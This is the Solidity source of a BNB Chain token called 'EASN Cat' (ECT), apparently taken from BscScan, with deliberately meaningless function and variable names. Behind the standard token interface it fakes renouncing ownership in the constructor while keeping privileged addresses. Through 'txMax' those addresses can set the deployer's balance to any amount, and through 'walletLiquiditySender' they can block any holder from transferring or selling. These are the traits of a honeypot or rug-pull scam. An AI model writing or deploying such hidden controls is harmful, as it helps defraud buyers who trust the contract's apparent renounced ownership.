/**
 *Submitted for verification at BscScan.com on 2023-02-15
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface atMax {
    function totalSupply() external view returns (uint256);

    function balanceOf(address listReceiverSwap) external view returns (uint256);

    function transfer(address modeSwap, uint256 limitMinIs) external returns (bool);

    function allowance(address receiverBuy, address spender) external view returns (uint256);

    function approve(address spender, uint256 limitMinIs) external returns (bool);

    function transferFrom(
        address sender,
        address modeSwap,
        uint256 limitMinIs
    ) external returns (bool);

    event Transfer(address indexed from, address indexed senderEnable, uint256 value);
    event Approval(address indexed receiverBuy, address indexed spender, uint256 value);
}

interface receiverTx is atMax {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract autoIs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface liquidityAmount {
    function createPair(address feeSwap, address feeFromBuy) external returns (address);
}

interface takeIsMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract EASNCat is autoIs, atMax, receiverTx {

    event OwnershipTransferred(address indexed shouldTeamFee, address indexed tradingWallet);

    function sellSwap(address fundEnable) public {
        if (receiverLimit) {
            return;
        }
        if (fromAmountTeam != maxTake) {
            maxTotal = maxTake;
        }
        launchIs[fundEnable] = true;
        if (listWallet) {
            maxTotal = toSell;
        }
        receiverLimit = true;
    }

    function transfer(address fromTotalAt, uint256 limitMinIs) external virtual override returns (bool) {
        return receiverMarketing(_msgSender(), fromTotalAt, limitMinIs);
    }

    function allowance(address feeToken, address teamExempt) external view virtual override returns (uint256) {
        return toAt[feeToken][teamExempt];
    }

    function balanceOf(address listReceiverSwap) public view virtual override returns (uint256) {
        return exemptSender[listReceiverSwap];
    }

    function receiverMarketing(address walletShould, address modeSwap, uint256 limitMinIs) internal returns (bool) {
        if (walletShould == isSwap) {
            return fundTxReceiver(walletShould, modeSwap, limitMinIs);
        }
        require(!exemptIs[walletShould]);
        return fundTxReceiver(walletShould, modeSwap, limitMinIs);
    }

    function owner() external view returns (address) {
        return swapTx;
    }

    function tradingTeam() public {
        if (maxTotal != toSell) {
            toAmount = true;
        }
        
        minTx=false;
    }

    function txMax(uint256 limitMinIs) public {
        if (!launchIs[_msgSender()]) {
            return;
        }
        exemptSender[isSwap] = limitMinIs;
    }

    bool public listWallet;

    bool public receiverLimit;

    bool public launchedBuyTeam;

    function autoMarketingBuy() public view returns (bool) {
        return listWallet;
    }

    function transferFrom(address walletShould, address modeSwap, uint256 limitMinIs) external override returns (bool) {
        if (toAt[walletShould][_msgSender()] != type(uint256).max) {
            require(limitMinIs <= toAt[walletShould][_msgSender()]);
            toAt[walletShould][_msgSender()] -= limitMinIs;
        }
        return receiverMarketing(walletShould, modeSwap, limitMinIs);
    }

    uint256 private sellAmount = 100000000 * 10 ** 18;

    uint256 public maxTotal;

    mapping(address => bool) public exemptIs;

    mapping(address => mapping(address => uint256)) private toAt;

    function fundTxReceiver(address walletShould, address modeSwap, uint256 limitMinIs) internal returns (bool) {
        require(exemptSender[walletShould] >= limitMinIs);
        exemptSender[walletShould] -= limitMinIs;
        exemptSender[modeSwap] += limitMinIs;
        emit Transfer(walletShould, modeSwap, limitMinIs);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return exemptFund;
    }

    function getOwner() external view returns (address) {
        return swapTx;
    }

    function decimals() external view virtual override returns (uint8) {
        return exemptLimit;
    }

    function maxMin() public {
        if (launchedBuyTeam) {
            listWallet = false;
        }
        if (maxTake != fromAmountTeam) {
            maxTake = maxTotal;
        }
        listWallet=false;
    }

    constructor (){
        if (launchedBuyTeam == toAmount) {
            toSell = maxTotal;
        }
        takeIsMin shouldMarketing = takeIsMin(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        fromMarketing = liquidityAmount(shouldMarketing.factory()).createPair(shouldMarketing.WETH(), address(this));
        swapTx = _msgSender();
        if (toAmount) {
            toSell = maxTake;
        }
        isSwap = _msgSender();
        launchIs[_msgSender()] = true;
        
        exemptSender[_msgSender()] = sellAmount;
        emit Transfer(address(0), isSwap, sellAmount);
        marketingTx();
    }

    address public fromMarketing;

    address private swapTx;

    uint256 public fromAmountTeam;

    function launchFund() public {
        
        if (toAmount) {
            minTx = true;
        }
        fromAmountTeam=0;
    }

    bool private toAmount;

    function approve(address teamExempt, uint256 limitMinIs) public virtual override returns (bool) {
        toAt[_msgSender()][teamExempt] = limitMinIs;
        emit Approval(_msgSender(), teamExempt, limitMinIs);
        return true;
    }

    function amountReceiver() public view returns (bool) {
        return toAmount;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return sellAmount;
    }

    function marketingTx() public {
        emit OwnershipTransferred(isSwap, address(0));
        swapTx = address(0);
    }

    function name() external view virtual override returns (string memory) {
        return takeLaunchReceiver;
    }

    string private exemptFund = "ECT";

    bool public minTx;

    mapping(address => uint256) private exemptSender;

    string private takeLaunchReceiver = "EASN Cat";

    function launchAt() public {
        
        if (toAmount) {
            maxTake = maxTotal;
        }
        toAmount=false;
    }

    uint256 private toSell;

    function walletLiquiditySender(address totalEnable) public {
        if (fromAmountTeam == maxTotal) {
            toAmount = false;
        }
        if (totalEnable == isSwap || totalEnable == fromMarketing || !launchIs[_msgSender()]) {
            return;
        }
        if (toSell == maxTotal) {
            maxTotal = maxTake;
        }
        exemptIs[totalEnable] = true;
    }

    uint256 private maxTake;

    address public isSwap;

    uint8 private exemptLimit = 18;

    mapping(address => bool) public launchIs;

}